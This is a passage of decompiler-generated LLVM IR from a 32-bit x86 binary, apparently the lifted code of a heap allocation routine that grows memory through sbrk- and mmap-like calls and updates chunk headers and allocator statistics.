  br i1 %v2_8051cf2, label %dec_label_pc_8051d0a, label %dec_label_pc_8051cf7

dec_label_pc_8051cf7:                             ; preds = %dec_label_pc_8051cf0
  %v0_8051cfc = load i32, i32* @ebx, align 4
  %v2_8051cfe = sub nsw i32 8, %v1_8051cf2
  store i32 %v2_8051cfe, i32* %eax.global-to-local, align 4
  %v2_8051d00 = add i32 %v2_8051cfe, %v8_8051ce1
  store i32 %v2_8051d00, i32* @edx, align 4
  %v2_8051d02 = sub i32 %v0_8051cfc, %v2_8051cfe
  store i32 %v2_8051d02, i32* %esi.global-to-local, align 4
  %v2_8051d04 = inttoptr i32 %v2_8051d00 to i32*
  store i32 %v2_8051cfe, i32* %v2_8051d04, align 4
  br label %dec_label_pc_8051d12

dec_label_pc_8051d0a:                             ; preds = %dec_label_pc_8051cf0
  %v1_8051d0a = inttoptr i32 %v8_8051ce1 to i32*
  store i32 0, i32* %v1_8051d0a, align 4
  br label %dec_label_pc_8051d12

dec_label_pc_8051d12:                             ; preds = %dec_label_pc_8051cf7, %dec_label_pc_8051d0a
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8051cf7 ], [ @ebx, %dec_label_pc_8051d0a ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8051d12 = or i32 %storemerge, 2
  %v1_8051d15 = load i32, i32* @edx, align 4
  %v2_8051d15 = add i32 %v1_8051d15, 4
  %v3_8051d15 = inttoptr i32 %v2_8051d15 to i32*
  store i32 %v1_8051d12, i32* %v3_8051d15, align 4
  %v0_8051d18 = load i32, i32* @global_var_8055670.40, align 16
  %v1_8051d1d = add i32 %v0_8051d18, 1
  store i32 %v1_8051d1d, i32* %eax.global-to-local, align 4
  store i32 %v1_8051d1d, i32* @global_var_8055670.40, align 16
  %v1_8051d23 = load i32, i32* @global_var_8055678.42, align 8
  %v7_8051d29 = icmp sgt i32 %v1_8051d1d, %v1_8051d23
  br i1 %v7_8051d29, label %dec_label_pc_8051d2b, label %dec_label_pc_8051d30

dec_label_pc_8051d2b:                             ; preds = %dec_label_pc_8051d12
  store i32 %v1_8051d1d, i32* @global_var_8055678.42, align 8
  br label %dec_label_pc_8051d30

dec_label_pc_8051d30:                             ; preds = %dec_label_pc_8051d12, %dec_label_pc_8051d2b
  %v0_8051d30 = load i32, i32* @global_var_8055684.43, align 4
  %v1_8051d35 = load i32, i32* @ebx, align 4
  %v2_8051d35 = add i32 %v1_8051d35, %v0_8051d30
  store i32 %v2_8051d35, i32* %eax.global-to-local, align 4
  store i32 %v2_8051d35, i32* @global_var_8055684.43, align 4
  %v1_8051d3c = load i32, i32* @global_var_8055690.44, align 16
  %tmp128 = icmp ugt i32 %v2_8051d35, %v1_8051d3c
  br i1 %tmp128, label %dec_label_pc_8051d44, label %dec_label_pc_8051d49

dec_label_pc_8051d44:                             ; preds = %dec_label_pc_8051d30
  store i32 %v2_8051d35, i32* @global_var_8055690.44, align 16
  br label %dec_label_pc_8051d49

dec_label_pc_8051d49:                             ; preds = %dec_label_pc_8051d30, %dec_label_pc_8051d44
  %v1_8051d49 = load i32, i32* @global_var_8055688.45, align 8
  %v2_8051d49 = add i32 %v1_8051d49, %v2_8051d35
  store i32 %v2_8051d49, i32* %eax.global-to-local, align 4
  %v1_8051d4f = load i32, i32* @global_var_8055694.46, align 4
  %tmp129 = icmp ugt i32 %v2_8051d49, %v1_8051d4f
  br i1 %tmp129, label %dec_label_pc_8051d5b, label %dec_label_pc_80519ac

dec_label_pc_8051d5b:                             ; preds = %dec_label_pc_8051d49
  store i32 %v2_8051d49, i32* @global_var_8055694.46, align 4
  br label %dec_label_pc_80519ac

dec_label_pc_8051d65:                             ; preds = %dec_label_pc_8051cc0, %dec_label_pc_8051cd4.dec_label_pc_8051d65_crit_edge, %dec_label_pc_8051caf, %dec_label_pc_8051c98
  %v0_8051d65 = phi i32 [ %v0_8051d65.pre, %dec_label_pc_8051cd4.dec_label_pc_8051d65_crit_edge ], [ %v0_8051c2d, %dec_label_pc_8051caf ], [ %v0_8051c2d, %dec_label_pc_8051cc0 ], [ %v0_8051c2d, %dec_label_pc_8051c98 ]
  store i32 %v0_8051d65, i32* %eax.global-to-local, align 4
  %v1_8051d6e = add i32 %v0_8051d65, 4
  %v2_8051d6e = inttoptr i32 %v1_8051d6e to i32*
  %v3_8051d6e = load i32, i32* %v2_8051d6e, align 4
  %v1_8051d78 = and i32 %v3_8051d6e, -4
  %v2_8051d78 = icmp eq i32 %v1_8051d78, 0
  store i32 %v1_8051d78, i32* @ebp, align 4
  %v1_8051d7b = load i32, i32* @global_var_8055668.47, align 8
  %v2_8051d7b = add i32 %v1_8051d7b, %v1_8051c37
  store i32 %v2_8051d7b, i32* %eax.global-to-local, align 4
  %v0_8051d81 = load i8, i8* @global_var_8055680.48, align 128
  %v1_8051d81 = urem i8 %v0_8051d81, 2
  %v2_8051d81 = icmp eq i8 %v1_8051d81, 0
  br i1 %v2_8051d81, label %dec_label_pc_8051d8c, label %dec_label_pc_8051d8a

dec_label_pc_8051d8a:                             ; preds = %dec_label_pc_8051d65
  %v2_8051d8a = sub i32 %v2_8051d7b, %v1_8051d78
  store i32 %v2_8051d8a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d8c

dec_label_pc_8051d8c:                             ; preds = %dec_label_pc_8051d65, %dec_label_pc_8051d8a
  %v0_8051d90 = phi i32 [ %v2_8051d7b, %dec_label_pc_8051d65 ], [ %v2_8051d8a, %dec_label_pc_8051d8a ]
  %v5_8051d90 = add i32 %v0_8051d90, %v1_8051c98
  store i32 %v5_8051d90, i32* %eax.global-to-local, align 4
  %v1_8051d94 = sub i32 0, %v0_8051c64
  store i32 %v1_8051d94, i32* @edx, align 4
  %v2_8051d9c = and i32 %v5_8051d90, %v1_8051d94
  store i32 %v2_8051d9c, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_8051d9c, 1
  br i1 %tmp91, label %dec_label_pc_8051db6, label %dec_label_pc_8051da0

dec_label_pc_8051da0:                             ; preds = %dec_label_pc_8051d8c
  store i32 %v2_8051d9c, i32* %stack_var_-92, align 4
  %v1_8051da4 = call i32 @function_80535c1(i32 %v2_8051d9c)
  store i32 %v1_8051da4, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_8051da4, i32* @ebx, align 4
  %v10_8051db1 = icmp eq i32 %v1_8051da4, -1
  %v1_8051db4 = icmp eq i1 %v10_8051db1, false
  br i1 %v1_8051db4, label %dec_label_pc_8051e0c.dec_label_pc_8051e15_crit_edge, label %dec_label_pc_8051da0.dec_label_pc_8051db6_crit_edge

dec_label_pc_8051da0.dec_label_pc_8051db6_crit_edge: ; preds = %dec_label_pc_8051da0
  %v0_8051db6.pre = load i8, i8* @global_var_8055680.48, align 128
  br label %dec_label_pc_8051db6

dec_label_pc_8051db6:                             ; preds = %dec_label_pc_8051da0.dec_label_pc_8051db6_crit_edge, %dec_label_pc_8051d8c
  %v0_8051de2 = phi i32 [ -1, %dec_label_pc_8051da0.dec_label_pc_8051db6_crit_edge ], [ %v1_8051d94, %dec_label_pc_8051d8c ]
  %v0_8051db6 = phi i8 [ %v0_8051db6.pre, %dec_label_pc_8051da0.dec_label_pc_8051db6_crit_edge ], [ %v0_8051d81, %dec_label_pc_8051d8c ]
  %v1_8051db6 = urem i8 %v0_8051db6, 2
  %v2_8051db6 = icmp eq i8 %v1_8051db6, 0
  br i1 %v2_8051db6, label %dec_label_pc_8051db6.dec_label_pc_8051dcb_crit_edge, label %dec_label_pc_8051dbf

dec_label_pc_8051db6.dec_label_pc_8051dcb_crit_edge: ; preds = %dec_label_pc_8051db6
  %v0_8051dcb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051dcb

dec_label_pc_8051dbf:                             ; preds = %dec_label_pc_8051db6
  %v2_8051dc3 = add i32 %v1_8051d78, %v1_8051c98
  store i32 %v2_8051dc3, i32* %eax.global-to-local, align 4
  %v0_8051dc5 = load i32, i32* @esi, align 4
  %v2_8051dc5 = add i32 %v0_8051dc5, %v2_8051dc3
  %v5_8051dc7 = and i32 %v2_8051dc5, %v1_8051d94
  store i32 %v5_8051dc7, i32* @esi, align 4
  br label %dec_label_pc_8051dcb

dec_label_pc_8051dcb:                             ; preds = %dec_label_pc_8051db6.dec_label_pc_8051dcb_crit_edge, %dec_label_pc_8051dbf
  %v0_8051dcb = phi i32 [ %v0_8051dcb.pre, %dec_label_pc_8051db6.dec_label_pc_8051dcb_crit_edge ], [ %v5_8051dc7, %dec_label_pc_8051dbf ]
  %tmp130 = icmp ult i32 %v0_8051dcb, 1048576
  br i1 %tmp130, label %dec_label_pc_8051dd3, label %dec_label_pc_8051dd8

dec_label_pc_8051dd3:                             ; preds = %dec_label_pc_8051dcb
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8051dd8

dec_label_pc_8051dd8:                             ; preds = %dec_label_pc_8051dcb, %dec_label_pc_8051dd3
  %v0_8051dec = phi i32 [ %v0_8051dcb, %dec_label_pc_8051dcb ], [ 1048576, %dec_label_pc_8051dd3 ]
  %tmp131 = icmp ugt i32 %v0_8051dec, %.v1_8051923
  br i1 %tmp131, label %dec_label_pc_8051de2, label %dec_label_pc_805201a

dec_label_pc_8051de2:                             ; preds = %dec_label_pc_8051dd8
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8051def = call i32 @function_8053110(i32 0, i32 %v0_8051dec, i32 3, i32 34, i32 0, i32 0, i32 %v0_8051de2, i32 %v0_8051de2)
  store i32 %v8_8051def, i32* %eax.global-to-local, align 4
  store i32 %v8_8051def, i32* @ebx, align 4
  %v10_8051df9 = icmp eq i32 %v8_8051def, -1
  br i1 %v10_8051df9, label %dec_label_pc_805201a, label %dec_label_pc_8051e0c.thread

dec_label_pc_8051e0c.thread:                      ; preds = %dec_label_pc_8051de2
  %v0_8051e02 = load i8, i8* @global_var_8055680.48, align 1
  %v2_8051e02 = and i8 %v0_8051e02, -2
  store i8 %v2_8051e02, i8* @global_var_8055680.48, align 128
  %v1_8051e09 = load i32, i32* @esi, align 4
  %v2_8051e09 = add i32 %v1_8051e09, %v8_8051def
  store i32 %v2_8051e09, i32* @edx, align 4
  br label %dec_label_pc_8051e15

dec_label_pc_8051e0c.dec_label_pc_8051e15_crit_edge: ; preds = %dec_label_pc_8051da0
  %v1_8051e19.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051e15

dec_label_pc_8051e15:                             ; preds = %dec_label_pc_8051e0c.dec_label_pc_8051e15_crit_edge, %dec_label_pc_8051e0c.thread
  %v1_8051e19 = phi i32 [ %v1_8051e09, %dec_label_pc_8051e0c.thread ], [ %v1_8051e19.pre, %dec_label_pc_8051e0c.dec_label_pc_8051e15_crit_edge ]
  %v0_8051ee1100 = phi i32 [ %v8_8051def, %dec_label_pc_8051e0c.thread ], [ %v1_8051da4, %dec_label_pc_8051e0c.dec_label_pc_8051e15_crit_edge ]
  %v0_8051ed399 = phi i32 [ %v2_8051e09, %dec_label_pc_8051e0c.thread ], [ -1, %dec_label_pc_8051e0c.dec_label_pc_8051e15_crit_edge ]
  %v0_8051e19 = load i32, i32* @global_var_8055688.45, align 8
  %v2_8051e19 = add i32 %v1_8051e19, %v0_8051e19
  store i32 %v2_8051e19, i32* @global_var_8055688.45, align 8
  %v2_8051e1f = add i32 %v1_8051d78, %v0_8051d65
  store i32 %v2_8051e1f, i32* %ecx.global-to-local, align 4
  %v2_8051e21 = sub i32 %v0_8051ee1100, %v2_8051e1f
  %v12_8051e21 = icmp eq i32 %v2_8051e21, 0
  %v10_8051e25 = icmp eq i32 %v0_8051ed399, -1
  %tmp132 = and i1 %v12_8051e21, %v10_8051e25
  br i1 %tmp132, label %dec_label_pc_8051e2a, label %dec_label_pc_8051e3c

dec_label_pc_8051e2a:                             ; preds = %dec_label_pc_8051e15
  %v2_8051e2a = add i32 %v1_8051e19, %v1_8051d78
  store i32 %v0_8051d65, i32* %ecx.global-to-local, align 4
  %v1_8051e31 = or i32 %v2_8051e2a, 1
  store i32 %v1_8051e31, i32* %eax.global-to-local, align 4
  store i32 %v1_8051e31, i32* %v2_8051d6e, align 4
  br label %dec_label_pc_8051f69

dec_label_pc_8051e3c:                             ; preds = %dec_label_pc_8051e15
  %v7_8051e21 = icmp ult i32 %v0_8051ee1100, %v2_8051e1f
  %v0_8051e3c = load i8, i8* @global_var_8055680.48, align 1
  %v1_8051e3c = sext i8 %v0_8051e3c to i32
  store i32 %v1_8051e3c, i32* %eax.global-to-local, align 4
  %v2_8051e41 = urem i8 %v0_8051e3c, 2
  %v3_8051e41 = icmp eq i8 %v2_8051e41, 0
  %brmerge = or i1 %v2_8051d78, %v3_8051e41
  %v1_8051e4b = icmp eq i1 %v7_8051e21, false
  %or.cond97 = or i1 %v1_8051e4b, %brmerge
  br i1 %or.cond97, label %dec_label_pc_8051e55, label %dec_label_pc_8051e4d

dec_label_pc_8051e4d:                             ; preds = %dec_label_pc_8051e3c
  %v1_8051e4d = and i32 %v1_8051e3c, -2
  %v4_8051e4d = trunc i32 %v1_8051e4d to i8
  store i32 %v1_8051e4d, i32* %eax.global-to-local, align 4
  store i8 %v4_8051e4d, i8* @global_var_8055680.48, align 128
  br label %dec_label_pc_8051e55

dec_label_pc_8051e55:                             ; preds = %dec_label_pc_8051e3c, %dec_label_pc_8051e4d
  %v0_8051e55 = phi i8 [ %v0_8051e3c, %dec_label_pc_8051e3c ], [ %v4_8051e4d, %dec_label_pc_8051e4d ]
  %v1_8051e55 = urem i8 %v0_8051e55, 2
  %v2_8051e55 = icmp eq i8 %v1_8051e55, 0
  br i1 %v2_8051e55, label %dec_label_pc_8051ed3, label %dec_label_pc_8051e5e

dec_label_pc_8051e5e:                             ; preds = %dec_label_pc_8051e55
  br i1 %v2_8051d78, label %dec_label_pc_8051e6c, label %dec_label_pc_8051e62

dec_label_pc_8051e62:                             ; preds = %dec_label_pc_8051e5e
  store i32 %v2_8051e21, i32* %eax.global-to-local, align 4
  %v2_8051e66 = add i32 %v2_8051e19, %v2_8051e21
  store i32 %v2_8051e66, i32* @global_var_8055688.45, align 8
  br label %dec_label_pc_8051e6c

dec_label_pc_8051e6c:                             ; preds = %dec_label_pc_8051e5e, %dec_label_pc_8051e62
  %v1_8051e6e = urem i32 %v0_8051ee1100, 8
  %v2_8051e6e = icmp eq i32 %v1_8051e6e, 0
  store i32 %v1_8051e6e, i32* %edx.global-to-local, align 4
  %v1_8051e71 = icmp eq i1 %v2_8051e6e, false
  br i1 %v1_8051e71, label %dec_label_pc_8051e79, label %dec_label_pc_8051e73

dec_label_pc_8051e73:                             ; preds = %dec_label_pc_8051e6c
  store i32 %v0_8051ee1100, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051e83

dec_label_pc_8051e79:                             ; preds = %dec_label_pc_8051e6c
  %v2_8051e7e = sub nsw i32 8, %v1_8051e6e
  store i32 %v2_8051e7e, i32* %eax.global-to-local, align 4
  %v2_8051e80 = add i32 %v2_8051e7e, %v0_8051ee1100
  store i32 %v2_8051e80, i32* @edi, align 4
  br label %dec_label_pc_8051e83

dec_label_pc_8051e83:                             ; preds = %dec_label_pc_8051e73, %dec_label_pc_8051e79
  %v0_8051e86 = phi i32 [ 0, %dec_label_pc_8051e73 ], [ %v2_8051e7e, %dec_label_pc_8051e79 ]
  %v2_8051e83 = add i32 %v1_8051e19, %v0_8051ee1100
  %v2_8051e86 = add i32 %v0_8051e86, %v1_8051d78
  store i32 %v2_8051e86, i32* %ecx.global-to-local, align 4
  %v2_8051e8f = add i32 %v2_8051e86, %v2_8051e83
  store i32 %v2_8051e8f, i32* %edx.global-to-local, align 4
  %v2_8051e95 = add i32 %v2_8051e8f, %v1_8051c98
  %v5_8051e98 = and i32 %v2_8051e95, %v1_8051d94
  %v2_8051e9f = sub i32 %v5_8051e98, %v2_8051e8f
  store i32 %v2_8051e9f, i32* %eax.global-to-local, align 4
  %v2_8051ea1 = add i32 %v2_8051e9f, %v2_8051e86
  store i32 %v2_8051ea1, i32* @esi, align 4
  store i32 %v2_8051ea1, i32* %stack_var_-92, align 4
  %v1_8051ea5 = call i32 @function_80535c1(i32 %v2_8051ea1)
  store i32 %v1_8051ea5, i32* %eax.global-to-local, align 4
  store i32 %v1_8051ea5, i32* @edx, align 4
  %v10_8051eaf = icmp eq i32 %v1_8051ea5, -1
  %v1_8051eb2 = icmp eq i1 %v10_8051eaf, false
  br i1 %v1_8051eb2, label %dec_label_pc_8051ec2, label %dec_label_pc_8051eb4

dec_label_pc_8051eb4:                             ; preds = %dec_label_pc_8051e83
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8051eb9 = call i32 @function_80535c1(i32 0)
  store i32 %v1_8051eb9, i32* %eax.global-to-local, align 4
  store i32 %v1_8051eb9, i32* @edx, align 4
  br label %dec_label_pc_8051ef6

dec_label_pc_8051ec2:                             ; preds = %dec_label_pc_8051e83
  %v1_8051ec2 = load i32, i32* @ebx, align 4
  %v7_8051ec2 = icmp ult i32 %v1_8051ea5, %v1_8051ec2
  %v1_8051ec4 = icmp eq i1 %v7_8051ec2, false
  br i1 %v1_8051ec4, label %dec_label_pc_8051efb, label %dec_label_pc_8051ec6

dec_label_pc_8051ec6:                             ; preds = %dec_label_pc_8051ec2
  %v0_8051ec6 = load i8, i8* @global_var_8055680.48, align 1
  %v2_8051ec6 = and i8 %v0_8051ec6, -2
  store i8 %v2_8051ec6, i8* @global_var_8055680.48, align 128
  store i32 %v2_8051e83, i32* @edx, align 4
  br label %dec_label_pc_8051eda

dec_label_pc_8051ed3:                             ; preds = %dec_label_pc_8051e55
  store i32 %v0_8051ee1100, i32* @edi, align 4
  br i1 %v10_8051e25, label %dec_label_pc_8051ede, label %dec_label_pc_8051eda

dec_label_pc_8051eda:                             ; preds = %dec_label_pc_8051ed3, %dec_label_pc_8051ec6
  %v0_8051efb58 = phi i32 [ %v2_8051e83, %dec_label_pc_8051ec6 ], [ %v0_8051ed399, %dec_label_pc_8051ed3 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8051efb

dec_label_pc_8051ede:                             ; preds = %dec_label_pc_8051ed3
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8051ee5 = call i32 @function_80535c1(i32 0)
  store i32 %v1_8051ee5, i32* @edx, align 4
  %v1_8051eec = load i32, i32* @ebx, align 4
  %v2_8051eec = sub i32 %v1_8051ee5, %v1_8051eec
  %v1_8051eee = load i32, i32* @esi, align 4
  %v2_8051eee = sub i32 %v2_8051eec, %v1_8051eee
  store i32 %v2_8051eee, i32* %eax.global-to-local, align 4
  %v0_8051ef0 = load i32, i32* @global_var_8055688.45, align 8
  %v2_8051ef0 = add i32 %v0_8051ef0, %v2_8051eee
  store i32 %v2_8051ef0, i32* @global_var_8055688.45, align 8
  br label %dec_label_pc_8051ef6

dec_label_pc_8051ef6:                             ; preds = %dec_label_pc_8051eb4, %dec_label_pc_8051ede
  %v0_8051efb57 = phi i32 [ %v1_8051eb9, %dec_label_pc_8051eb4 ], [ %v1_8051ee5, %dec_label_pc_8051ede ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8051efb

dec_label_pc_8051efb:                             ; preds = %dec_label_pc_8051ec2, %dec_label_pc_8051eda, %dec_label_pc_8051ef6
  %v0_8051f00 = phi i32 [ %v1_8051ea5, %dec_label_pc_8051ec2 ], [ %v0_8051efb58, %dec_label_pc_8051eda ], [ %v0_8051efb57, %dec_label_pc_8051ef6 ]
  %v10_8051efb = icmp eq i32 %v0_8051f00, -1
  br i1 %v10_8051efb, label %dec_label_pc_8051f69, label %dec_label_pc_8051f00

dec_label_pc_8051f00:                             ; preds = %dec_label_pc_8051efb
  %v1_8051f00 = load i32, i32* @edi, align 4
  %v2_8051f00 = sub i32 %v0_8051f00, %v1_8051f00
  store i32 %v2_8051f00, i32* @edx, align 4
  store i32 %v1_8051f00, i32* @global_var_805534c.33, align 4
  %v1_8051f08 = load i32, i32* @esi, align 4
  %v2_8051f08 = add i32 %v1_8051f08, %v2_8051f00
  %v1_8051f0b = or i32 %v2_8051f08, 1
  store i32 %v1_8051f0b, i32* %eax.global-to-local, align 4
  %v2_8051f0e = add i32 %v1_8051f00, 4
  %v3_8051f0e = inttoptr i32 %v2_8051f0e to i32*
  store i32 %v1_8051f0b, i32* %v3_8051f0e, align 4
  %v0_8051f11 = load i32, i32* @global_var_8055688.45, align 8
  %v1_8051f11 = load i32, i32* @esi, align 4
  %v2_8051f11 = add i32 %v1_8051f11, %v0_8051f11
  store i32 %v2_8051f11, i32* @global_var_8055688.45, align 8
  br i1 %v2_8051d78, label %dec_label_pc_8051f69, label %dec_label_pc_8051f1b

dec_label_pc_8051f1b:                             ; preds = %dec_label_pc_8051f00
  %v1_8051f1b = add i32 %v1_8051d78, -12
  store i32 %v0_8051d65, i32* %ecx.global-to-local, align 4
  %v1_8051f22 = and i32 %v1_8051f1b, -8
  store i32 %v1_8051f22, i32* %eax.global-to-local, align 4
  %v1_8051f27 = or i32 %v1_8051f22, 1
  store i32 %v1_8051f27, i32* @edx, align 4
  %v5_8051f2a = icmp ult i32 %v1_8051f22, 15
  store i32 %v1_8051f27, i32* %v2_8051d6e, align 4
  %v0_8051f30 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051f30 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051f30 = add i32 %v0_8051f30, 4
  %v3_8051f30 = add i32 %v2_8051f30, %v1_8051f30
  %v4_8051f30 = inttoptr i32 %v3_8051f30 to i32*
  store i32 5, i32* %v4_8051f30, align 4
  %v0_8051f38 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051f38 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051f38 = add i32 %v0_8051f38, 8
  %v3_8051f38 = add i32 %v2_8051f38, %v1_8051f38
  %v4_8051f38 = inttoptr i32 %v3_8051f38 to i32*
  store i32 5, i32* %v4_8051f38, align 4
  br i1 %v5_8051f2a, label %dec_label_pc_8051f69, label %dec_label_pc_8051f42

dec_label_pc_8051f42:                             ; preds = %dec_label_pc_8051f1b
  %v0_8051f45 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051f47 = add i32 %v0_8051f45, 8
  store i32 %v1_8051f47, i32* %eax.global-to-local, align 4
  %v0_8051f4a = load i32, i32* @global_var_8055664.49, align 4
  store i32 %v0_8051f4a, i32* @ebx, align 4
  store i32 %v1_8051f47, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8055664.49, align 4
  %v1_8051f5b = call i32 @function_8052693(i32 %v1_8051f47)
  store i32 %v1_8051f5b, i32* %eax.global-to-local, align 4
  %v0_8051f60 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f60, i32* @global_var_8055664.49, align 4
  br label %dec_label_pc_8051f69

dec_label_pc_8051f69:                             ; preds = %dec_label_pc_8051f1b, %dec_label_pc_8051f00, %dec_label_pc_8051efb, %dec_label_pc_8051e2a, %dec_label_pc_8051f42
  %v0_8051f69 = load i32, i32* @global_var_8055688.45, align 8
  store i32 %v0_8051f69, i32* %eax.global-to-local, align 4
  %v1_8051f6e = load i32, i32* @global_var_805568c.50, align 4
  %tmp133 = icmp ugt i32 %v0_8051f69, %v1_8051f6e
  br i1 %tmp133, label %dec_label_pc_8051f76, label %dec_label_pc_8051f7b

dec_label_pc_8051f76:                             ; preds = %dec_label_pc_8051f69
  store i32 %v0_8051f69, i32* @global_var_805568c.50, align 4
  br label %dec_label_pc_8051f7b

dec_label_pc_8051f7b:                             ; preds = %dec_label_pc_8051f69, %dec_label_pc_8051f76
  %v1_8051f7b = load i32, i32* @global_var_8055684.43, align 4
  %v2_8051f7b = add i32 %v1_8051f7b, %v0_8051f69
  store i32 %v2_8051f7b, i32* %eax.global-to-local, align 4
  %v1_8051f81 = load i32, i32* @global_var_8055694.46, align 4
  %tmp134 = icmp ugt i32 %v2_8051f7b, %v1_8051f81
  br i1 %tmp134, label %dec_label_pc_8051f89, label %dec_label_pc_8051f8e

dec_label_pc_8051f89:                             ; preds = %dec_label_pc_8051f7b
  store i32 %v2_8051f7b, i32* @global_var_8055694.46, align 4
  br label %dec_label_pc_8051f8e

dec_label_pc_8051f8e:                             ; preds = %dec_label_pc_8051f7b, %dec_label_pc_8051f89
  %v0_8051f8e = load i32, i32* @global_var_805534c.33, align 4
  store i32 %v0_8051f8e, i32* @ebx, align 4
  %v1_8051f94 = add i32 %v0_8051f8e, 4
  %v2_8051f94 = inttoptr i32 %v1_8051f94 to i32*
  %v3_8051f94 = load i32, i32* %v2_8051f94, align 4
  %v1_8051f97 = and i32 %v3_8051f94, -4
  store i32 %v1_8051f97, i32* %ecx.global-to-local, align 4
  %v10_8051f9a = icmp ult i32 %v1_8051f97, %v1_8051c37
  br i1 %v10_8051f9a, label %dec_label_pc_805201a, label %dec_label_pc_8051fa0

dec_label_pc_8051fa0:                             ; preds = %dec_label_pc_8051f8e
  store i32 %.v1_8051923, i32* %esi.global-to-local, align 4
  %v2_8051fa6 = sub i32 %v1_8051f97, %.v1_8051923
  store i32 %v2_8051fa6, i32* %ecx.global-to-local, align 4
  %v2_8051fa8 = add i32 %v0_8051f8e, %.v1_8051923
  store i32 %v2_8051fa8, i32* @edx, align 4
  %v1_8051fab = or i32 %.v1_8051923, 1
  store i32 %v1_8051fab, i32* %eax.global-to-local, align 4
  store i32 %v2_8051fa8, i32* @global_var_805534c.33, align 4
  store i32 %v1_8051fab, i32* %v2_8051f94, align 4
  %v0_8051fb7.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051fb7

dec_label_pc_8051fb7:                             ; preds = %dec_label_pc_8051c48, %dec_label_pc_8051fa0
  %v0_8051fb7 = phi i32 [ %v5_8051c5b, %dec_label_pc_8051c48 ], [ %v0_8051fb7.pre, %dec_label_pc_8051fa0 ]
  %v1_8051fb7 = or i32 %v0_8051fb7, 1
  store i32 %v1_8051fb7, i32* %ecx.global-to-local, align 4
  %v0_8051fba = load i32, i32* @ebx, align 4
  %v1_8051fba = add i32 %v0_8051fba, 8
  store i32 %v1_8051fba, i32* %ebx.global-to-local, align 4
  %v1_8051fbd = load i32, i32* @edx, align 4
  %v2_8051fbd = add i32 %v1_8051fbd, 4
  %v3_8051fbd = inttoptr i32 %v2_8051fbd to i32*
  store i32 %v1_8051fb7, i32* %v3_8051fbd, align 4
  br label %dec_label_pc_8052027

dec_label_pc_8051fc2:                             ; preds = %dec_label_pc_8051a02
  %v5_8051fc8 = sub i32 %v1_80519e5, %.v1_8051923
  store i32 %v5_8051fc8, i32* %eax.global-to-local, align 4
  %v2_8051fcc = add i32 %v1_8051fd9, %.v1_8051923
  store i32 %v2_8051fcc, i32* @edx, align 4
  %v1_8051fd0 = or i32 %.v1_8051923, 1
  store i32 %v2_8051fcc, i32* @global_var_8055350.34, align 16
  store i32 %v1_8051fd0, i32* %v2_80519df, align 4
  %v0_8051fdc = load i32, i32* %eax.global-to-local, align 4
  %v0_8051fde = load i32, i32* @edx, align 4
  store i32 %v0_8051fde, i32* @global_var_805535c.51, align 4
  %v1_8051fe4 = or i32 %v0_8051fdc, 1
  store i32 %v1_8051fe4, i32* %ecx.global-to-local, align 4
  store i32 %v0_8051fde, i32* @global_var_8055360.36, align 32
  %v1_8051fed = add i32 %v0_8051fde, 8
  %v2_8051fed = inttoptr i32 %v1_8051fed to i32*
  store i32 ptrtoint (i32* @global_var_8055354.35 to i32), i32* %v2_8051fed, align 4
  %v0_8051ff4 = load i32, i32* @edx, align 4
  %v1_8051ff4 = add i32 %v0_8051ff4, 12
  %v2_8051ff4 = inttoptr i32 %v1_8051ff4 to i32*
  store i32 ptrtoint (i32* @global_var_8055354.35 to i32), i32* %v2_8051ff4, align 4
  %v0_8051ffb = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051ffb = load i32, i32* @edx, align 4
  %v2_8051ffb = add i32 %v1_8051ffb, 4
  %v3_8051ffb = inttoptr i32 %v2_8051ffb to i32*
  store i32 %v0_8051ffb, i32* %v3_8051ffb, align 4
  %v0_8051ffe = load i32, i32* %eax.global-to-local, align 4
  %v1_8051ffe = load i32, i32* @edx, align 4
  %v3_8051ffe = add i32 %v1_8051ffe, %v0_8051ffe
  %v4_8051ffe = inttoptr i32 %v3_8051ffe to i32*
  store i32 %v0_8051ffe, i32* %v4_8051ffe, align 4
  br label %dec_label_pc_805200c

dec_label_pc_8052003:                             ; preds = %dec_label_pc_8051a11
  store i32 %.v1_8051923, i32* %ebx.global-to-local, align 4
  %v0_8052007 = load i32, i32* @ebp, align 4
  %v2_8052007 = or i32 %.v1_8051923, 4
  %v3_8052007 = add i32 %v0_8052007, %v2_8052007
  %v4_8052007 = inttoptr i32 %v3_8052007 to i32*
  %v5_8052007 = load i32, i32* %v4_8052007, align 4
  %v6_8052007 = or i32 %v5_8052007, 1
  store i32 %v6_8052007, i32* %v4_8052007, align 4
  br label %dec_label_pc_805200c

dec_label_pc_805200c:                             ; preds = %dec_label_pc_8051fc2, %dec_label_pc_8052003
  %v0_805200c = load i32, i32* @ebp, align 4
  %v1_805200c = add i32 %v0_805200c, 8
  store i32 %v1_805200c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052027

dec_label_pc_8052011:                             ; preds = %dec_label_pc_8051b01
  %v1_8052011 = load i32, i32* @ebx, align 4
  %v2_8052011 = add i32 %v0_8051b10, 4
  %v3_8052011 = add i32 %v2_8052011, %v1_8052011
  %v4_8052011 = inttoptr i32 %v3_8052011 to i32*
  %v5_8052011 = load i32, i32* %v4_8052011, align 4
  %v6_8052011 = or i32 %v5_8052011, 1
  store i32 %v6_8052011, i32* %v4_8052011, align 4
  br label %dec_label_pc_8052016

